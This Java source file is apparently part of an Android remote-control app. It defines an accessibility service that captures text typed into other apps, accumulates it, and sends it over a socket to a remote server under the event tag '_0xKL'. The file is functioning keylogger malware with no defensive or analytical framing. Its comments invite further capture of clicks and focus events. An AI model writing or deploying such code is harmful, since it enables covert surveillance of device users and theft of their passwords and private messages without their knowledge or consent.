package com.remote.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;

import com.remote.app.socket.IOSocket;

public class CustomAccessibilityService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;
        switch (eventType) {
            /*
                You can use catch other events like touch and focus

                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                     eventText = "Clicked: ";
                     break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                     eventText = "Focused: ";
                     break;
            */
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                eventText = "Typed: ";
                words += event.getText();
                break;
        }
        eventText = eventText + event.getText();

        //print the typed text in the console. Or do anything you want here.
        System.out.println("ACCESSIBILITY SERVICE : " + eventText);

        //todo check
        IOSocket.getInstance().send("_0xKL", words);
    }

    private String words = null;

    @Override
    public void onInterrupt() {
        //whatever
    }

    @Override
    public void onServiceConnected() {
        //configure our Accessibility service
        AccessibilityServiceInfo info = getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        this.setServiceInfo(info);
    }

}
